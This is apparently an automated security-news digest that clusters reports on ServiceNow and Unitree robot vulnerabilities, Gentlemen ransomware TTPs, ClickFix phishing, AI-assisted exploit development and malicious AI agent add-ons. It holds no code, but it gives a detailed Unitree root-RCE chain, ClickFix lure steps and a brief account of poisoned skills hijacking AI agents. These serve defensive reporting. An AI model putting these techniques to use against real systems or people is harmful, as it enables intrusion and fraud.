- confidence_tier: tier_1_government

#### Summary

```
Introduction
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Guildma (Astaroth) malware infection from Brazilian Portuguese email, (Tue, Sep 1st)
  - Published: 2026-09-01T21:30:18+00:00
  - Link: https://isc.sans.edu/diary/rss/33300
  - Summary: Introduction

### Cluster 4e25b47cb5 — score 9

- Title: Some Malicious PE Stats, (Thu, Aug 27th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-08-28T07:04:13+00:00
- Link: https://isc.sans.edu/diary/rss/33292
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
During my last FOR610 session, a student asked me if I had some statistics in mind about the compilers used to generate malicious PE files? A couple of months ago, I shared some stats about the trend in 64bits VS. 32bits malware[ 1 ]. Can we go a bit further? I (vibe-)coded a Python script based on the pefile library[ 2 ] to extract some info from the PE headers. Indeed, the PE file format contains a lot of metadata! They can be accessed using a lot of tools, like Detect It Easy:
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Some Malicious PE Stats, (Thu, Aug 27th)
  - Published: 2026-08-28T07:04:13+00:00
  - Link: https://isc.sans.edu/diary/rss/33292
  - Summary: During my last FOR610 session, a student asked me if I had some statistics in mind about the compilers used to generate malicious PE files? A couple of months ago, I shared some stats about the trend in 64bits VS. 32bits malware[ 1 ]. Can we go a bit further? I (vibe-)coded a Python script based on the pefile library[ 2 ] to extract some info from the PE headers. Indeed, the PE file format contains a lot of metadata! They can be accessed using a lot of tools, like Detect It Easy:

### Cluster dab6d42f29 — score 9

- Title: AI Agent Firewall Startup AIR Security Emerges From Stealth With $50 Million
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-09-03T12:00:00+00:00
- Link: https://www.securityweek.com/ai-agent-firewall-startup-air-security-emerges-from-stealth-with-50-million/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ai_security, supply_chain
- affected_industries: government
- affected_products: Anthropic/Claude, GitHub, OpenAI/ChatGPT
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, ai_security, active_exploitation
- affected_industries: government
- affected_products: GitHub, Anthropic/Claude, OpenAI/ChatGPT
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The startup’s firewall evaluates AI skills, plugins and MCP servers for malicious instructions, excessive permissions and software supply chain risks. The post AI Agent Firewall Startup AIR Security Emerges From Stealth With $50 Million appeared first on SecurityWeek .
```

#### Full body

```
If AI agents are the new operating system, then AI add-ons are the new applications; and a new type of AI firewall is required to maintain security. AIR Security is emerging from stealth with $50 million funding and a firewall, also called AIR, built for AI agents. The funding is led by Sequoia Capital and Greenoaks together with a range of prominent individual industry angels. This follows AIR Security’s research that found more than 17,800 public AI add-ons (representing 6.7M installations) relying on untrusted external instruction sources. The firm also discovered AI Skills in the wild impersonating companies like Anthropic and OpenAI and designed to bypass security reviews and execute arbitrary code. AI agents are increasingly connecting to more tools, data and third-party services; browsing websites, accessing files and emails and acting on behalf of employees. Their growing autonomy is problematic when influenced and directed by adversaries through poisoned content or direct compromise. This opens a path to data theft, fraud, or unauthorized access while providing little visibility to the security team. AIR describes AI agents as the new operating system, with AI add-ons the new applications. “We’re entering a new era where using AI agents will become as elementary to knowledge work as reading, writing, and using Excel. Agents will become a fundamental part of how enterprises build, operate, and make decisions – unlocking entirely new levels of speed, productivity, and what’s possible,” says AIR. Of particular concern is the new and increasing output from coding agents: Claude Code, Cursor, Codex, and everything around them. Enterprises have started adopting these tools at an unprecedented pace. But they’re also afraid to deploy them without a seatbelt – and rightfully so, suggests AIR. Advertisement. Scroll to continue reading. “Every enterprise has a firewall protecting its network. Now they need one protecting their AI agents. AI agents need a new kind of firewall – one that protects what enters their context,” says Yair Saban , co-founder and CEO of AIR. “Today, agents are autonomously installing tools, connecting to internal systems, and making decisions – and in most organizations, nobody knows what’s running, what’s trusted, or how to shut it off.” Saban (CEO) partnered with Niv Hoffman (CTO) to found AIR in order to provide such an AI-specific firewall. They were joined by Ryan Knisley , former CISO at The Walt Disney Company and Costco Wholesale, as chief strategy officer. The firewall discovers and evaluates every skill, plugin, MCP server, and add-on across an organization’s AI agent supply chain, both before and after deployment. Before any third-party or internal add-on is allowed to touch an enterprise agent, AIR performs deep analysis across known agentic attack patterns. It screens for external instruction sources, hidden behaviors, and typo-squatted packages masquerading as official developer tools. If an add-on is malicious, vulnerable or not approved, security teams can trace every agent and workflow that depends on it — and revoke it across the organization. This process is continuous. If a maintainer pushes a malicious update or an existing integration is compromised later, trust is automatically revoked. “Like a black box, AI Add-ons reveal less than they hide. Some stay the same. Some evolve. Others hide external instructions, excessive actions, sensitive data access, or vulnerable supply chains,” says AIR. Through its continuous evaluation of agentic activity across many customers, AIR also offers a marketplace of pre-vetted, certified add-ons, providing a safe route to expand agent capabilities without introducing unmanaged risk, for all its customers. Related : OpenLeash Adds a Human Check to Risky AI Agent Actions Related : UK Government Rolls Out Agentic AI Defense Plan Alongside Industry Pledge Related : Critical Vulnerability Exposes GitHub Agentic Workflows to Prompt Injection Related : Age
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: AI Agent Firewall Startup AIR Security Emerges From Stealth With $50 Million
  - Published: 2026-09-03T12:00:00+00:00
  - Link: https://www.securityweek.com/ai-agent-firewall-startup-air-security-emerges-from-stealth-with-50-million/
  - Summary: The startup’s firewall evaluates AI skills, plugins and MCP servers for malicious instructions, excessive permissions and software supply chain risks. The post AI Agent Firewall Startup AIR Security Emerges From Stealth With $50 Million appeared first on SecurityWeek .

### Cluster 8c8de09e73 — score 9

- Title: AI’s Vulnerability Surge May Be More Manageable Than First Feared
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-09-02T21:14:06+00:00
- Link: https://www.darkreading.com/application-security/ai-vulnerability-surge-manageable-than-first-feared
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- affected_products: Anthropic/Claude
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain
- affected_products: Anthropic/Claude
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
New research suggests the coming Vulnpocalypse may not be so overwhelming for enterprise security teams — if they have the right strategies.
```

#### Full body

```
Application Security Cyber Risk Threat Intelligence Vulnerabilities & Threats News AI’s Vulnerability Surge May Be More Manageable Than First Feared New research suggests the coming Vulnpocalypse may not be so overwhelming for enterprise security teams — if they have the right strategies. Jai Vijayan , Contributing Writer September 2, 2026 4 Min Read Source: FotoField via Shutterstock A new study suggests that while AI is rapidly accelerating vulnerability discovery , enterprise organizations are better equipped to handle the surge than generally assumed. The key is their ability to quickly validate findings, prioritize risk and get available fixes into production. Software supply chain security firm Echo recently analyzed nearly 40,000 CVE life cycles across 250 open source container projects, drawing on a year of its own platform telemetry, survey responses from more than 80 security leaders, and an independent analysis of Anthropic's Claude Mythos . AI Has Accelerated One Side of the Equation The results, detailed in a report titled Mythos Readiness Report , show how AI is transforming vulnerability discovery and exploit development — something that security teams have been encountering firsthand over the past year. Monthly CVE disclosures rose 145% in two years, from 3,173 in June 2024 to 7,765 in June 2026, partly due to the expansion of the CVE program and increasingly because of AI-assisted vulnerability discovery. On an annual basis, CVE disclosures shot up from 30,949 in 2023 to 49,979 in 2025 and, based on the numbers so far, 2026 is on track to surpass even that number. Related: Attackers Pounce on Critical Artifactory Bug Following Disclosure Echo discovered the same pattern with container base images, of which Node and Python are the most frequently used. Between January and June 2026, the number of known CVEs in Node base images surged 338%, from around 16,000 to 70,000, while for Python the numbers went from 17,500 to 45,000 in the same period. "Vulnerabilities are now being discovered at machine speed, while remediation remains largely manual," Echo wrote in its report. "In essence AI has dramatically accelerated once side of the equation, but the other has yet to catch up." Echo found that Claude Mythos has fundamentally changed the economics of exploit development and made it possible for researchers and bad actors to develop a working exploit for a known vulnerability in less than one day and for under $2,000. A More Nuanced Reality for Security Teams While the raw data might suggest a situation that is quickly spiraling out of control for organizations, Echo found some reasons for optimism. For one thing, a lot of the vulnerabilities that AI tools are discovering are not yet vetted and often turn out to be less serious than initially assumed. For example, over the period that Echo studied, Mythos discovered some 23,019 potential vulnerabilities. But fewer than 10% had been external validated, or independently checked. Of the 27 vulnerabilities that Anthropic publicly disclosed, Mythos initially classified eight of them as being of critical severity. But after researchers independently reviewed the eight flaws, only one retained the critical rating. Related: 'HTTP Terminator' Hunts for Novel Desync Attacks "One of the biggest surprises was that being ready for Mythos is actually much more achievable than expected," Eylam Milner, chief technology officer (CTO) and co-founder at Echo, tells Dark Reading. "Mythos is really good at finding real vulnerabilities, but it’s much less reliable at determining how serious those vulnerabilities actually are, which is a really important distinction for security teams trying to decide what requires their attention." Rather than completely rethinking everything they’re doing around vulnerability management , he says, organizations need to focus on infrastructure for quickly validating a larger number of vulnerabilities, understanding what matters and then remediating them
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: AI’s Vulnerability Surge May Be More Manageable Than First Feared
  - Published: 2026-09-02T21:14:06+00:00
  - Link: https://www.darkreading.com/application-security/ai-vulnerability-surge-manageable-than-first-feared
  - Summary: New research suggests the coming Vulnpocalypse may not be so overwhelming for enterprise security teams — if they have the right strategies.

### Cluster 3754befed2 — score 9

- Title: Leaked Russian Cyber-Operations Training Materials
- Source: Schneier on Security (practitioner_analysis)
- Published: 2026-09-01T16:29:10+00:00
- Link: https://www.schneier.com/blog/archives/2026/09/leaked-russian-cyber-operations-training-materials.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: government
- content_type: incident_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- affected_industries: government
- content_type: incident_report
- confidence_tier: tier_3_analysis

#### Summary

```
This is interesting: The records describe a force-generation mechanism for several General Staff components, including the GRU, Main Operational Directorate, and 8th Directorate, which is associated with protected communications, cryptography, and information security. […] The reporting also linked a 2024 Department No. 4 graduate, Aleksei Kondrashov, to Military Unit 74455, widely known as Sandworm. That unit has been associated with destructive cyber activity against Ukraine and other targets, including the 2017 NotPetya attack. The reports do not establish that every listed graduate participated in a named operation; assignments should therefore be described as reported unit placements, not proof of individual operational involvement...
```

#### Full body

```
ResearcherZero • September 2, 2026 2:55 AM @Clive Robinson People have to be taught to blend in, act like the locals and know their customs. They cannot get too upset about perceived provocations against the Russian state, or they might blow their cover. The language and accent is they main thing they need to get right. Westerns are strange creatures and their society is perfectly organized for complete f’cking psychopaths who need to rise through the ranks, while enjoying a little midnight killing during their spare time and some illicit trade. Laundering money and criminal enterprise are essential for raising funds, bribing or entrapping officials and creating the kind of environments where one can encourage compromising behaviour. Unit 29155 recruited out of special forces and sometimes the Russian penal system (long before the invasion of Crimea). Of those selected, they looked for individuals with sociopathic tendencies with the ability to commit acts without remorse and maintain composure while they lied about it. People who murdered strangers or family members without provocation, then smiled and acted as if nothing had happened, or stated they were simply an innocent bystander who was attempting to offer assistance. Candidates were put through the Spetsnaz training regime and those who completed it successfully were then selected for specific roles, based on their abilities. Some underwent further training for overseas deployment, much like the Illegals program, but with very different objectives. Unit 29155 also recruits locally in target countries. Murder and assassination of non-Russians is not covered in the media when it involves undeclared foreign agents and is rarely pursued by police. This allows GRU operatives to operate with impunity and without alerting those in the spaces and professions targeted. There is a need for recruits with more modern skills and of a younger age – who talk the right lingo. Today assets can be recruited by the internet for cheap, disposable missions and then discarded. But intelligence officers who are well trained are still needed to replace those who are burned or retire. Given that the GRU has a deep interest in top secret blueprints for missile and naval technology, and that material they have stolen from FiveEyes has been used in Ukraine and by Russian nuclear forces, those nations should be paying a little more attention to GRU activities within their borders. Agents are permanently living in close proximity to naval bases where they have a clear view of movements of vessels in and out of those bases, and personnel who work at such facilities. Others are working inside government departments or have assets within government departments willing to assist them. As you stated, these agents are cunning and they enjoy their work, especially violence. Other activities by resident GRU are more concerning, but land within the area that cannot be published. If I had a check list to undermine the capabilities of a nation from within and compromise its institutions, so that nation could no longer properly protect itself or identify external threats, many have been achieved. Fortunately for the GRU, they do not have to do all that work for themselves. … The Army Secretary resigned after months of friction with Hesgeth. Being focused on modernization and military readiness, rather than the Trump administration’s fixation with culture wars, is not enough to keep servicemen out of Hesgeth’s crosshairs. Driscoll is among a number of losses of high ranking military officials to leave. Recognizing allies and properly identifying foes, vulnerabilities and threats is a key leadership requirement. https://edition.cnn.com/2026/08/31/politics/army-secretary-dan-driscoll-resigns The departure of at least 20 top generals and military chiefs have created a leadership vacuum. Positions left vacant were overseeing modernization and readiness efforts. They have not been filed by permanent fixtures. It leav
```

#### Corroborating sources (1)

- **Schneier on Security** (practitioner_analysis)
  - Title: Leaked Russian Cyber-Operations Training Materials
  - Published: 2026-09-01T16:29:10+00:00
  - Link: https://www.schneier.com/blog/archives/2026/09/leaked-russian-cyber-operations-training-materials.html
  - Summary: This is interesting: The records describe a force-generation mechanism for several General Staff components, including the GRU, Main Operational Directorate, and 8th Directorate, which is associated with protected communications, cryptography, and information security. […] The reporting also linked a 2024 Department No. 4 graduate, Aleksei Kondrashov, to Military Unit 74455, widely known as Sandworm. That unit has been associated with destructive cyber activity against Ukraine and other targets, including the 2017 NotPetya attack. The reports do not establish that every listed graduate participated in a named operation; assignments should therefore be described as reported unit placements, not proof of individual operational involvement...

### Cluster b1eb2141e2 — score 9

- Title: Two Unitree G1 EDU Humanoid Robot Flaws Enable Root RCE, One Starts Over Bluetooth
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-28T12:07:24+00:00
- Link: https://thehackernews.com/2026/08/two-unitree-g1-edu-humanoid-robot-flaws.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-76639, CVE-2026-76640

#### Cluster taxonomy (union across members)
- affected_industries: critical_infrastructure
- cve_ids: CVE-2026-76639, CVE-2026-76640
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- affected_industries: critical_infrastructure
- cve_ids: CVE-2026-76639, CVE-2026-76640
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Security researcher Olivier Laflamme has disclosed two independent root remote code execution (RCE) chains affecting the Unitree G1 EDU, including a Bluetooth Low Energy (BLE) path that can reach root on the robot's Locomotion PC. The flaws are tracked as CVE-2026-76639 and CVE-2026-76640, with the first involving a network-adjacent path through chat_go and bashrunner and the
```

#### Full body

```
Two Unitree G1 EDU Humanoid Robot Flaws Enable Root RCE, One Starts Over Bluetooth  Swati Khandelwal  Aug 28, 2026 Vulnerability / IoT Security Security researcher Olivier Laflamme has disclosed two independent root remote code execution (RCE) chains affecting the Unitree G1 EDU , including a Bluetooth Low Energy (BLE) path that can reach root on the robot's Locomotion PC. The flaws are tracked as CVE-2026-76639 and CVE-2026-76640 , with the first involving a network-adjacent path through chat_go and bashrunner and the second beginning from BLE proximity. An exact fixed firmware release has not been verified in any accessible Unitree guidance, leaving G1 EDU owners without a confirmed release target for either vulnerability. Laflamme said Unitree patched the cloud account-to-robot ownership check in July 2026, closing the cross-owner arbitrary-G1 path. As of the August 27 disclosure, a G1 owner could still use an account bound to their own robot to recover its Advanced Encryption Standard (AES) key. The underlying BLE issues, a write to 0xFFE2 that does not require pairing and the BSS buffer overflow, are separate from the cloud fix. Laflamme published the research on August 27, 2026, describing the two issues as separate root-RCE paths. The research timeline shows Laflamme upgraded the test robot to V1.5.2, but that sequence does not by itself establish V1.5.1.1 as affected. In his technical disclosure , Laflamme said CVE-2026-76639 uses a path-traversal condition in chat_go to reach bashrunner. Execution through bashrunner results in root code execution on the Locomotion PC. Laflamme described CVE-2026-76639 as an independent RCE, although he reused it as one disclosure primitive while demonstrating the separate BLE chain tracked as CVE-2026-76640. For CVE-2026-76640, the initial BLE write path accepts the bootstrap interaction without Bluetooth pairing. The bootstrap material itself remains protected, and the later Wi-Fi provisioning operations require the application's authenticated BLE state. During Laflamme's research, Unitree's cloud service accepted a valid Unitree account for the key-recovery request but did not verify that the account owned the supplied robot. That authorization gap allowed the account to recover key material associated with another G1 EDU. The recovered key could then be used to establish the authenticated BLE state required by the Wi-Fi provisioning operations. The Wi-Fi heredoc injection in wpa_connect.sh then forced the G1 onto the attacker's hotspot, providing a network pivot. Root execution came from a separate buffer overflow in btgatt-server , where a 1,050-byte write through the 500-byte wifi_ssid BSS buffer corrupted the event loop into calling system() as root on the Locomotion PC. Laflamme limited his propagation test to two G1 robots in one room. He said in the August 27 disclosure that the cloud authorization fix breaks that exact proof-of-concept flow. Unitree's official product page distinguishes the G1 and G1 EDU as separate models, while broader applicability of the two new vulnerabilities to other Unitree robots remains unconfirmed. The Hacker News has reached out to Unitree to confirm the fixed firmware versions, the affected product scope, and the current remediation status, and will update the story with any response. Corrected on September 2, 2026: An earlier version incorrectly located the buffer overflow in the Wi-Fi provisioning code, embedded a non-BLE demonstration where the Bluetooth Low Energy chain was discussed, and did not fully describe the scope of Unitree's cloud authorization fix; the overflow is in btgatt-server , and the video and patch-status description have been corrected. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Bluetooth , Humanoid , iot security , network security , remote code execution , Vulnerability , Wireless Security
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Two Unitree G1 EDU Humanoid Robot Flaws Enable Root RCE, One Starts Over Bluetooth
  - Published: 2026-08-28T12:07:24+00:00
  - Link: https://thehackernews.com/2026/08/two-unitree-g1-edu-humanoid-robot-flaws.html
  - Summary: Security researcher Olivier Laflamme has disclosed two independent root remote code execution (RCE) chains affecting the Unitree G1 EDU, including a Bluetooth Low Energy (BLE) path that can reach root on the robot's Locomotion PC. The flaws are tracked as CVE-2026-76639 and CVE-2026-76640, with the first involving a network-adjacent path through chat_go and bashrunner and the

### Cluster e19a5bfe01 — score 9

- Title: Three CVSS 10.0 ServiceNow Flaws Could Let Unauthenticated Attackers Execute Code and SQL
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-28T11:20:32+00:00
- Link: https://thehackernews.com/2026/08/three-cvss-100-servicenow-flaws-could.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_industries: government
- cve_ids: CVE-2026-18885, CVE-2026-18886, CVE-2026-6875, CVE-2026-6876, CVE-2026-74820
- urgency_signals: critical_cvss, poc_available, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_industries: government
- cve_ids: CVE-2026-18885, CVE-2026-18886, CVE-2026-74820, CVE-2026-6876, CVE-2026-6875
- urgency_signals: preauth_unauth, poc_available, critical_cvss
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
ServiceNow has released patches for four security flaws impacting the ServiceNow AI Platform, three of them rated 10.0 on the CVSS scoring system and exploitable, in certain circumstances, by an unauthenticated attacker. The company said it deployed a security update to hosted instances and provided the update to its partners and self-hosted customers, which leaves organizations that run their
```

#### Full body

```
Three CVSS 10.0 ServiceNow Flaws Could Let Unauthenticated Attackers Execute Code and SQL  Swati Khandelwal  Aug 28, 2026 Vulnerability / Cloud Security ServiceNow has released patches for four security flaws impacting the ServiceNow AI Platform, three of them rated 10.0 on the CVSS scoring system and exploitable, in certain circumstances, by an unauthenticated attacker. The company said it deployed a security update to hosted instances and provided the update to its partners and self-hosted customers, which leaves organizations that run their own instances to apply the fixes themselves. The advisory was published on August 27, 2026, and the four vulnerabilities are listed below - CVE-2026-18885 (CVSS score: 10.0) - A code injection vulnerability in the GraphQL Composite Data API that could enable an unauthenticated user to execute arbitrary code and gain access to, or modify, instance data CVE-2026-18886 (CVSS score: 10.0) - An improper access control vulnerability in the system configuration image upload processor that could enable an unauthenticated user to create or modify instance data, resulting in privilege escalation CVE-2026-74820 (CVSS score: 10.0) - A SQL injection vulnerability reached through a dynamic schema ORDER BY clause that could enable an unauthenticated user to execute arbitrary SQL statements against the instance's underlying database CVE-2026-6876 (CVSS score: 8.7) - A sandbox escape in the Now Platform that could allow an unauthenticated user to execute arbitrary code The three maximum-severity flaws share the vector CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H , describing a network-reachable attack of low complexity that requires no privileges and no user interaction, and that carries high impact to confidentiality, integrity, and availability in both the vulnerable component and the systems connected to it. The advisory follows CVE-2026-6875, a pre-authentication sandbox escape in the same platform. Searchlight Cyber reported that flaw to ServiceNow on April 1, 2026. ServiceNow published the advisory for it on July 13. Threat intelligence firm Defused said days after the July advisory that it was observing in-the-wild exploitation of CVE-2026-6875. It subsequently issued a correction stating that the captured payload matched Searchlight Cyber's published proof-of-concept (PoC) exploit . "ServiceNow is aware of a cybersecurity company's recent publication regarding exploitation activity associated with a previously disclosed security vulnerability, identified as CVE-2026-6875," a ServiceNow spokesperson told The Hacker News. "Based on our investigation to date, we have not observed evidence that this activity is related to instances that ServiceNow hosts." "We have provided updates and patches designed to address this issue, and we encourage our self-hosted and ServiceNow-hosted customers to apply the relevant patches if they have not already done so. In addition, we will continue to work directly with customers who need assistance in applying the patches," the spokesperson said. The 10.0 ratings are ServiceNow's own. The company is the CVE Numbering Authority for its products, and since April 15, 2026, NIST has enriched only vulnerabilities that appear in CISA's Known Exploited Vulnerabilities catalog , affect federal government software, or are designated critical under Executive Order 14028. None of the four flaws appeared in the catalog as of August 28, 2026, leaving ServiceNow's ratings as the only severity assessment on record. ServiceNow rated all three of the new maximum-severity flaws at low attack complexity. It scored the sandbox escape reported exploited in July at 9.5 under the same version of the scoring system, with every metric identical to the three except attack complexity, which it set to high. ServiceNow lists the following versions as affected in its August advisory - Xanadu - any version before Patch 11 Hot Fix 7a Yokohama - any version before Patch 12 Hot Fi
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Three CVSS 10.0 ServiceNow Flaws Could Let Unauthenticated Attackers Execute Code and SQL
  - Published: 2026-08-28T11:20:32+00:00
  - Link: https://thehackernews.com/2026/08/three-cvss-100-servicenow-flaws-could.html
  - Summary: ServiceNow has released patches for four security flaws impacting the ServiceNow AI Platform, three of them rated 10.0 on the CVSS scoring system and exploitable, in certain circumstances, by an unauthenticated attacker. The company said it deployed a security update to hosted instances and provided the update to its partners and self-hosted customers, which leaves organizations that run their

### Cluster ef8817c361 — score 8

- Title: Ungentlemanly behavior: Insights into a ransomware operation
- Source: Sophos X-Ops (detection_response_operations)
- Published: 2026-09-01T00:00:00+00:00
- Link: https://www.sophos.com/en-us/blog/ungentlemanly-behavior-insights-into-a-ransomware-operation
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- affected_products: Fortinet
- cve_ids: CVE-2024-55591
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- affected_products: Fortinet
- cve_ids: CVE-2024-55591
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Analysis of 15 intrusions revealed tradecraft used by GOLD SHERWOOD affiliates Categories: Threat Research Tags: ransomware as a service, The Gentlemen, GOLD SHERWOOD, Ransomware
```

#### Full body

```
Ungentlemanly behavior: Insights into a ransomware operation Analysis of 15 intrusions revealed tradecraft used by GOLD SHERWOOD affiliates Written by Sophos Counter Threat Unit Research Team Threat Research ransomware as a service The Gentlemen GOLD SHERWOOD Ransomware Share This Link Copied Counter Threat Unit™ (CTU) researchers identified a consistent post-exploitation playbook used in The Gentlemen ransomware-as-a-service (RaaS) scheme, operated by a threat group that CTU™ researchers track as GOLD SHERWOOD . Rapid privilege escalation, adaptive tool usage, and aggressive defense evasion enable ransomware deployment soon after initial access, sometimes within 24 hours of the first identified post-compromise activity. The affiliates leverage legitimate tools and compromised credentials to evade detection and accelerate impact. Organizations should prioritize hardening remote access services, enforcing multi-factor authentication (MFA), monitoring administrative activity, and detecting anomalous use of data exfiltration tools and staging directories. Analysis GOLD SHERWOOD began operating The Gentlemen RaaS scheme in mid-2025 as a double-extortion model, in which affiliates steal data to hold for ransom before encrypting files. Victim names were first posted to a dedicated leak site in September 2025. That same month, an advertisement recruiting affiliates for a generous 90/10 ransom percentage split appeared on the RAMP underground forum. Fewer than 20 victim names were posted each month throughout the remainder of 2025, but the average rose to over 75 at the beginning of 2026 (see Figure 1). This shift suggests that the number of active affiliates increased during this period. By the end of July 2026, a total of 683 victim names had been added to the leak site. July alone accounted for 169 of these victims, making it the most active leak site that month. Figure 1: Number of victims listed on The Gentlemen leak site each month from September 2025 through July 2026 The Gentlemen RaaS victimology is typical of an opportunistic cybercriminal enterprise. The named victims represent a wide variety of sectors (see Figure 2), suggesting that affiliates compromise organizations purely based on available access. Figure 2: Proportion of listed The Gentlemen ransomware victims by sector In line with the surge in published victims at the beginning of 2026, Sophos analysts observed the first attempted deployment of The Gentlemen ransomware against a Sophos customer. CTU analysis of 15 separate incidents provided insight into the tactics, techniques, and procedures (TTPs) used in The Gentlemen ransomware network intrusions. Initial access Multiple third-party reports suggest that The Gentlemen affiliates rely on exploiting vulnerabilities in firewalls and abusing VPN services credentials to gain access to victims’ environments. For example, in March, Group-IB described how affiliates conducted reconnaissance to identify internet-exposed FortiGate firewall management interfaces vulnerable to CVE-2024-55591. In May, leaked Rocket chat logs showed the group testing stolen credentials against a range of VPN services. CTU researchers identified artifacts in multiple intrusions that suggested Fortinet endpoints might have been exploited for initial access, but confirmation was not possible from the available telemetry. In a February incident, a threat actor obtained initial access to a victim’s environment by using compromised user credentials to authenticate to a Fortinet SSL VPN service. The connection originated from an external IP address geolocated to the Netherlands and resulted in the assignment of an internal VPN address. The absence of MFA enabled the actor to gain access via the stolen or brute-forced credentials. In the hour immediately following access, the threat actor established multiple VPN sessions from different foreign IP addresses, indicating early-stage operational redundancy and access validation. Lateral movement In the
```

#### Corroborating sources (1)

- **Sophos X-Ops** (detection_response_operations)
  - Title: Ungentlemanly behavior: Insights into a ransomware operation
  - Published: 2026-09-01T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/ungentlemanly-behavior-insights-into-a-ransomware-operation
  - Summary: Analysis of 15 intrusions revealed tradecraft used by GOLD SHERWOOD affiliates Categories: Threat Research Tags: ransomware as a service, The Gentlemen, GOLD SHERWOOD, Ransomware

### Cluster 5d8c6875e0 — score 8

- Title: Next-Gen Phishing Tactics Users Aren’t Ready For | Huntress
- Source: Huntress (detection_response_operations)
- Published: 2026-08-28T16:00:00+00:00
- Link: https://www.huntress.com/blog/advanced-phishing-tradecraft
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_products: OpenAI/ChatGPT, Anthropic/Claude
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Move past basic credential harvesting. Discover how modern attackers use ClickFix, BitB, and OAuth consent phishing—and how to train your users with Huntress SAT.
```

#### Full body

```
Home Blog Beyond the Login Field: The Evolved Phishing Tradecraft Your Users Aren't Ready For Last Updated: August 28, 2026 Beyond the Login Field: The Evolved Phishing Tradecraft Your Users Aren't Ready For By: Shannon Grey James O’Leary Summarize with AI Summarize ChatGPT Claude Perplexity Google AI For years, standard Security Awareness Training (SAT) has conditioned users to look for the same old red flags: a misspelled domain name, a sketchy sender address, and a frantic call to action leading to a poorly cloned Microsoft login page. Today’s adversaries have largely moved past simple credential harvesting. Why spend time trying to brute-force or bypass multi-factor authentication (MFA) when you can just trick the user into bypassing it for you? Modern phishing attacks leverage sophisticated browser manipulation, malicious cloud app consent requests, and clever social engineering shortcuts that renders traditional 'check the URL' tactics insufficient as a standalone defense against sophisticated phishing campaigns At Huntress, we believe your simulated defenses should mirror real-world offenses. Our SOC manages millions of endpoints and identities through Managed EDR and ITDR, giving us direct visibility into the tactics and tradecraft attackers are actively using to compromise organizations. These threats have evolved well beyond what most simulated phishing scenarios cover. That’s why we’ve populated our SAT library with 'Featured' scenarios that replicate these highly evolved, complex threat actor tradecraft. Here is a look inside the advanced tactics we’re simulating—and how we help your users spot the setup before a real attacker targets them. 1. ClickFix Attackers have realized that convincing a user to download and run an .exe file is getting harder. Instead, they are manipulating users into executing malicious code via standard system tools under the guise of fake CAPTCHA to prove themselves as human users. See here . Figure 1: In a ClickFix attack, targets are asked to complete a series of steps, leading to them unwittingly executing malicious code The actual threat : ClickFix is a highly deceptive social engineering technique that completely sidesteps traditional browser defenses by weaponizing user muscle memory and routine troubleshooting habits. The attack intercepts the victim with a simulated CAPTCHA prompt. Instead of forcing a suspicious .exe file download that would trigger browser warnings and user anxiety, it manipulates the user into executing a precise sequence of standard keyboard shortcuts (Win + R, Ctrl + V, and Enter) to manually paste and run the malicious command directly within their native terminal. How we replicate it : The scenario begins with a targeted phishing email disguised as a DocuSign document requiring an immediate electronic signature. When the user clicks the embedded link to view the document, they are directed to a simulated landing page where a fraudulent verification overlay intercepts them, displaying these instructions: To better prove you are not a robot, please: Press & hold the Windows Key + R. In the 